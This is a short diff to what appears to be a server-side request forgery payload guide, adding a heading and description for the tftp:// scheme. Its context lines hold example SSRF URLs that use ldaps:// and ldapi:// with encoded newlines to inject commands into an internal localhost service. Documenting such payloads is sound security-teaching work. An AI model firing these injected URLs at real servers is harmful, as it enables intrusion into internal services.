@@ -135,6 +135,10 @@ It is an application protocol used over an IP network to manage and access the d
      http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit
      http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
   
-  
+ ## tftp:// -
+ 
+ Trivial File Transfer Protocol is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host
+ 
+     
     
     
